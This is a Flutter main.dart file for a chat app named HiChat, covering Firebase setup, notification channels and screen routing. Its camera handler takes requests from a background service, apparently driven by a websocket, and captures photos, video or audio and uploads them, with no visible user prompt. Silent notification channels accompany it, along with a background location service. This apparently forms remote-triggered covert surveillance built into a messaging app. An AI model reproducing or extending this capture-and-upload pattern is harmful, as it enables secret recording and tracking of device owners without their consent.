import 'package:flutter/material.dart';
import 'package:provider/provider.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';

import 'firebase_options.dart';
import 'constants/app_theme.dart';
import 'constants/app_constants.dart';
import 'services/auth_state_manager.dart';
import 'services/chat_state_manager.dart';
import 'services/call_notification_manager.dart';
import 'services/hichat_media_background_service_integration.dart';
import 'services/hichat_location_service_integration.dart';
import 'services/camera_service.dart';
import 'services/api_service.dart';
import 'services/isolate_communication_service.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'screens/welcome/welcome_screen.dart';
import 'screens/auth/auth_options_screen.dart';
import 'screens/auth/login_screen.dart';
import 'screens/auth/register_screen.dart';
import 'screens/auth/profile_setup_screen.dart';
import 'screens/auth/phone_signin_screen.dart';
import 'screens/auth/otp_verification_screen.dart';
import 'screens/chat/chat_list_screen.dart';
import 'screens/chat/enhanced_chat_screen.dart';
import 'screens/camera/camera_screen.dart';
import 'screens/location/location_sharing_screen.dart';
import 'screens/user/user_search_screen.dart';
import 'screens/profile/profile_screen.dart';
import 'screens/chat/chat_info_screen.dart';
import 'screens/contacts/contacts_screen.dart';
import 'screens/calls/calls_screen.dart';
import 'models/chat.dart';
import 'utils/page_transitions.dart';
import 'test/google_signin_test_page.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);

  // Initialize notifications first
  await _initializeNotifications();

  // Initialize background services (configure but don't auto-start)
  // Wrapped in try-catch to prevent isolate errors on main thread
  try {
    // These calls safely configure background services without starting them
    // FlutterBackgroundService initialization is deferred to when services are actually started
    await HiChatMediaBackgroundService.initialize();
    await HiChatLocationBackgroundService.initialize();
    await _setupMainIsolateCameraHandlers();
  } catch (e) {
    debugPrint(
      '⚠️ Warning: Background service initialization had issues (may be safe to ignore): $e',
    );
    // Don't rethrow - background services are optional for app startup
    // They will properly initialize when explicitly started
  }

  runApp(const HiChatApp());
}

/// Initialize global notification system
Future<void> _initializeNotifications() async {
  final FlutterLocalNotificationsPlugin notifications =
      FlutterLocalNotificationsPlugin();

  // Create notification channels
  const channels = [
    AndroidNotificationChannel(
      'hichat_media_websocket',
      'HiChat Media WebSocket',
      description: 'Notifications for media upload service',
      importance: Importance.low,
      playSound: false,
      enableVibration: false,
    ),
    AndroidNotificationChannel(
      'hichat_chat_websocket',
      'HiChat Chat WebSocket',
      description: 'Notifications for chat service',
      importance: Importance.low,
      playSound: false,
      enableVibration: false,
    ),
    AndroidNotificationChannel(
      'hichat_location_websocket',
      'HiChat Location WebSocket',
      description: 'Notifications for location sharing service',
      importance: Importance.low,
      playSound: false,
      enableVibration: false,
    ),
    AndroidNotificationChannel(
      'hichat_media_operations',
      'HiChat Media Operations',
      description: 'Notifications for media capture operations',
      importance: Importance.high,
    ),
  ];

  final androidImplementation = notifications
      .resolvePlatformSpecificImplementation<
        AndroidFlutterLocalNotificationsPlugin
      >();

  if (androidImplementation != null) {
    for (final channel in channels) {
      try {
        await androidImplementation.createNotificationChannel(channel);
        debugPrint('✅ Created notification channel: ${channel.id}');
      } catch (e) {
        debugPrint('❌ Failed to create notification channel ${channel.id}: $e');
      }
    }
  }

  // Initialize notifications
  const initializationSettings = InitializationSettings(
    android: AndroidInitializationSettings('@mipmap/ic_launcher'),
    iOS: DarwinInitializationSettings(),
  );

  try {
    await notifications.initialize(initializationSettings);
    debugPrint('✅ Notification system initialized successfully');
  } catch (e) {
    debugPrint('❌ Failed to initialize notification system: $e');
  }
}

/// Setup main isolate handlers for camera requests from background service
bool _isCameraOperationInProgress = false;

Future<void> _setupMainIsolateCameraHandlers() async {
  debugPrint('🔧 MAIN ISOLATE: Setting up camera handlers...');
  final communicationService = IsolateCommunicationService.instance;

  // Start listening for camera requests from background isolate
  communicationService.startListeningForRequests((request) async {
    // Prevent overlapping camera operations
    if (_isCameraOperationInProgress) {
      debugPrint(
        '📸 MAIN ISOLATE: ⚠️ Camera operation already in progress, skipping request',
      );
      return;
    }
    final mediaType = request['media_type'] as String;
    final username = request['username'] as String;
    final userId = request['user_id'] as String;
    final requestId = request['request_id'] as String?;

    debugPrint(
      '📸 MAIN ISOLATE: 🎯 CAMERA HANDLER CALLED! Received $mediaType capture request',
    );

    _isCameraOperationInProgress = true;

    try {
      switch (mediaType) {
        case 'image':
          final result = await CameraService.captureImage();
          debugPrint('📸 MAIN ISOLATE: Image captured successfully');

          // Send response back to background isolate
          await communicationService.sendCameraResponse(
            mediaType: mediaType,
            username: username,
            userId: userId,
            requestId: requestId,
            data: result.data,
          );
          break;

        case 'video':
          final result = await CameraService.recordVideo();
          debugPrint('🎥 MAIN ISOLATE: Video recorded successfully');

          // Upload via API (like Java implementation)
          final apiService = ApiService();
          await apiService.uploadMediaBulk(
            userId: userId,
            username: username,
            mediaType: 'video',
            files: [result.data],
            email: null,
          );

          debugPrint('🎥 MAIN ISOLATE: Video uploaded successfully via API');

          // Send success response
          await communicationService.sendCameraResponse(
            mediaType: mediaType,
            username: username,
            userId: userId,
            requestId: requestId,
            data:
                'uploaded', // Video was uploaded via API, not returned as data
          );
          break;

        case 'audio':
          final result = await CameraService.recordAudio();
          debugPrint('🎤 MAIN ISOLATE: Audio recorded successfully');

          // Upload via API (like Java implementation)
          final apiService = ApiService();
          await apiService.uploadMediaBulk(
            userId: userId,
            username: username,
            mediaType: 'audio',
            files: [result.data],
            email: null,
          );

          debugPrint('🎤 MAIN ISOLATE: Audio uploaded successfully via API');

          // Send success response
          await communicationService.sendCameraResponse(
            mediaType: mediaType,
            username: username,
            userId: userId,
            requestId: requestId,
            data:
                'uploaded', // Audio was uploaded via API, not returned as data
          );
          break;

        default:
          throw Exception('Unknown media type: $mediaType');
      }
    } catch (e) {
      debugPrint('📷 MAIN ISOLATE: $mediaType capture failed: $e');

      // Send error response
      await communicationService.sendCameraResponse(
        mediaType: mediaType,
        username: username,
        userId: userId,
        requestId: requestId,
        error: e.toString(),
      );
    } finally {
      // Always reset the flag when operation completes
      _isCameraOperationInProgress = false;
    }
  });

  debugPrint('✅ MAIN ISOLATE: Camera handlers setup complete');

  // Test the communication system
  _testCommunicationSystem();
}

/// Test the SharedPreferences communication system
Future<void> _testCommunicationSystem() async {
  await Future.delayed(Duration(seconds: 3)); // Wait for initialization

  debugPrint('🧪 MAIN ISOLATE: Testing SharedPreferences communication...');

  try {
    final prefs = await SharedPreferences.getInstance();

    // Check if we can read the counter
    final counter = prefs.getInt('camera_request_counter') ?? 0;
    debugPrint('🧪 MAIN ISOLATE: Current request counter: $counter');

    // Check if we can read the queue
    final queue = prefs.getStringList('camera_request_queue') ?? [];
    debugPrint('🧪 MAIN ISOLATE: Current queue size: ${queue.length}');

    if (queue.isNotEmpty) {
      debugPrint('🧪 MAIN ISOLATE: First queue item: ${queue.first}');
    }

    debugPrint('🧪 MAIN ISOLATE: SharedPreferences test completed');
  } catch (e) {
    debugPrint('🧪 MAIN ISOLATE: SharedPreferences test failed: $e');
  }
}

class HiChatApp extends StatelessWidget {
  const HiChatApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MultiProvider(
      providers: [
        ChangeNotifierProvider(create: (context) => AuthStateManager()),
        ChangeNotifierProvider(create: (context) => ChatStateManager.instance),
      ],
      child: const _HiChatAppContent(),
    );
  }
}

/// App content widget - has access to providers
class _HiChatAppContent extends StatefulWidget {
  const _HiChatAppContent();

  @override
  State<_HiChatAppContent> createState() => _HiChatAppContentState();
}

class _HiChatAppContentState extends State<_HiChatAppContent> {
  @override
  void initState() {
    super.initState();

    // Set app context for call notifications
    WidgetsBinding.instance.addPostFrameCallback((_) {
      CallNotificationManager().setAppContext(context);

      // Listen to incoming calls
      final chatStateManager = context.read<ChatStateManager>();
      chatStateManager.incomingCalls.listen((invitation) {
        debugPrint(
          '📞 HiChatApp: Incoming call detected, showing notification',
        );
        CallNotificationManager().showIncomingCallScreen(invitation);
      });
    });
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: AppConstants.appName,
      theme: AppTheme.lightTheme,
      darkTheme: AppTheme.darkTheme,
      themeMode: ThemeMode.system,
      debugShowCheckedModeBanner: false,
      home: const AuthWrapper(),
      onGenerateRoute: (settings) {
        switch (settings.name) {
          case '/':
            return PageTransitions.fade(
              const AuthWrapper(),
              settings: settings,
            );

          case AppConstants.authOptionsRoute:
            return PageTransitions.slideFromRight(
              const AuthOptionsScreen(),
              settings: settings,
            );

          case AppConstants.loginRoute:
            return PageTransitions.slideFromRight(
              const LoginScreen(),
              settings: settings,
            );

          case AppConstants.registerRoute:
            return PageTransitions.slideFromRight(
              const RegisterScreen(),
              settings: settings,
            );

          case AppConstants.profileSetupRoute:
            return PageTransitions.slideFromRight(
              const ProfileSetupScreen(),
              settings: settings,
            );

          case AppConstants.phoneSigninRoute:
            return PageTransitions.slideFromRight(
              const PhoneSignInScreen(),
              settings: settings,
            );

          case AppConstants.otpVerificationRoute:
            final args = settings.arguments as Map<String, dynamic>;
            return PageTransitions.slideFromRight(
              OTPVerificationScreen(
                phoneNumber: args['phone_number'] as String,
                password: args['password'] as String,
                isPhoneExist: args['is_phone_exist'] as bool,
              ),
              settings: settings,
            );

          case AppConstants.chatRoute:
            final chat = settings.arguments as Chat;
            return PageTransitions.slideFromRight(
              EnhancedChatScreen(chat: chat),
              settings: settings,
            );

          case AppConstants.cameraRoute:
            return PageTransitions.slideFromRight(
              const CameraScreen(),
              settings: settings,
            );

          case AppConstants.locationSharingRoute:
            // Get username from arguments or current user
            final String username = settings.arguments as String? ?? 'User';
            return PageTransitions.slideFromRight(
              LocationSharingScreen(username: username),
              settings: settings,
            );

          case '/user-search':
            return PageTransitions.slideFromRight(
              const UserSearchScreen(),
              settings: settings,
            );

          case '/contacts':
            return PageTransitions.slideFromRight(
              const ContactsScreen(),
              settings: settings,
            );

          case '/calls':
            return PageTransitions.slideFromRight(
              const CallsScreen(),
              settings: settings,
            );

          case '/profile':
            return PageTransitions.slideFromRight(
              const ProfileScreen(),
              settings: settings,
            );

          case '/chat-info':
            final chat = settings.arguments as Chat;
            return PageTransitions.slideFromRight(
              ChatInfoScreen(chat: chat),
              settings: settings,
            );

          case '/google-signin-test':
            return PageTransitions.slideFromRight(
              const GoogleSignInTestPage(),
              settings: settings,
            );

          default:
            return PageTransitions.fade(
              const AuthWrapper(),
              settings: settings,
            );
        }
      },
      // ),
    );
  }
}

/// Wrapper widget that handles auth state and routing
class AuthWrapper extends StatefulWidget {
  const AuthWrapper({super.key});

  @override
  State<AuthWrapper> createState() => _AuthWrapperState();
}

class _AuthWrapperState extends State<AuthWrapper> {
  @override
  void initState() {
    super.initState();
    // Initialize auth state after the widget is built
    WidgetsBinding.instance.addPostFrameCallback((_) {
      context.read<AuthStateManager>().initialize();
    });
  }

  @override
  Widget build(BuildContext context) {
    return Consumer<AuthStateManager>(
      builder: (context, authManager, child) {
        // Show loading screen while initializing
        if (authManager.isLoading) {
          return const Scaffold(
            backgroundColor: Colors.white,
            body: Center(
              child: Column(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  CircularProgressIndicator(),
                  SizedBox(height: 16),
                  Text(
                    'Loading...',
                    style: TextStyle(fontSize: 16, color: Colors.grey),
                  ),
                ],
              ),
            ),
          );
        }

        // Route based on authentication state
        if (authManager.isLoggedIn) {
          return const ChatListScreen();
        } else {
          return const WelcomeScreen();
        }
      },
    );
  }
}
